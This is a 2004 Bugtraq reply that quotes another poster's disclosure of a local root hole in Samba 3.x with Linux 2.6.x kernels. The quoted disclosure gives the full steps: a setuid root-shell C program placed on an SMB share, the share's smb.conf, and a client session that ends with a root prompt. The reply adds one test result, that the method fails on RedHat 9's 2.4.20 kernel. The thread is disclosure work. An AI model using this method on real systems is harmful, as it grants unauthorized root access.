
Date: Tue, 10 Feb 2004 11:35:32 -0000
From: John.Airey@...b.org.uk
To: bugtraq@...urityfocus.com
Subject: RE: Samba 3.x + kernel 2.6.x local root vulnerability


> -----Original Message-----
> From: Michal Medvecky [mailto:M.Medvecky@...cvut.cz]
> Sent: 09 February 2004 21:23
> To: bugtraq@...urityfocus.com
> Subject: Samba 3.x + kernel 2.6.x local root vulnerability
> 
> 
> -----BEGIN PGP SIGNED MESSAGE-----
> Hash: SHA1
> 
> "share" - smb server
> "slovakia" - smb client
>                                                               
>                                                               
>                    
> misko@...vakia:~$ smbmount --version
> Usage: mount.smbfs service mountpoint [-n] [-o options,...]
> Version 3.0.1-Debian
>                                                               
>                                                               
>                    
> misko@...vakia:~$ ls -l /usr/bin/smbmount
> - - -rwxr-xr-x    1 root     root       591756 2004-01-13 
> 20:29 /usr/bin/smbmount
> misko@...vakia:~$ ls -l /usr/bin/smbmnt
> - - -rwsr-sr-x    1 root     root         8088 2004-01-13 
> 20:29 /usr/bin/smbmnt
>      ^                                                        
>                                                               
>                    
> 
> Confirmed to be default on Debian and Mandrake.
> 
> share:/data/share# cat a.c
> main()
> {
>         setuid(0);
>         setgid(0);
>         system("/bin/bash");
> }
>                                                               
>                                                               
>                    
> share:/data/share# make a
> cc     a.c   -o a
> share:/data/share# chmod +s a
> share:/data/share#
>                                                               
>                                                               
>                    
> share:/etc/samba/smb.conf
>                                                               
>                                                               
>                    
> [share]
> path = /data/share
> writable = no
> locking = no
> public = yes
> guest ok = yes
> comment = Share
>                                                               
>                                                               
>                    
> share:/data/share# ls -l a
> - - -rwsr-sr-x    1 root     root        11716 Feb  8 12:39 a
>                                                               
>                                                               
>                    
> misko@...vakia:~$ ls -l pokus/a
> - - -rwsr-sr-x    1 root     root        11716 2004-02-08 
> 12:39 pokus/a
> misko@...vakia:~$ pokus/a
> root@...vakia:~# id
> uid=0(root) gid=0(root) 
> skupiny=1000(misko),0(root),29(audio),100(users),1034(mtr),1035(333)
> root@...vakia:~#
> 
> Confirmed to work on all 2.6.x kernels, not confirmed on 2.4.x.

Doesn't work on kernel 2.4.20-8.9 for RedHat Linux 9, even after making
/usr/bin/smbmnt suid root (it isn't by default). 

- 
John Airey, BSc (Jt Hons), CNA, RHCE
Internet systems support officer, ITCSD, Royal National Institute of the
Blind,
Bakewell Road, Peterborough PE2 6XU,
Tel.: +44 (0) 1733 375299 Fax: +44 (0) 1733 370848 John.Airey@...b.org.uk 

According to the book of Acts, Eutychus was the first man to suffer from a
General Protection Fault with Windows.

- 
DISCLAIMER: 

NOTICE: The information contained in this email and any attachments is 
confidential and may be privileged. If you are not the intended 
recipient you should not use, disclose, distribute or copy any of the 
content of it or of any attachment; you are requested to notify the 
sender immediately of your receipt of the email and then to delete it 
and any attachments from your system. 

RNIB endeavours to ensure that emails and any attachments generated by 
its staff are free from viruses or other contaminants. However, it 
cannot accept any responsibility for any  such which are transmitted.
We therefore recommend you scan all attachments. 

Please note that the statements and views expressed in this email and 
any attachments are those of the author and do not necessarily represent 
those of RNIB. 

RNIB Registered Charity Number: 226227 

Website: http://www.rnib.org.uk 


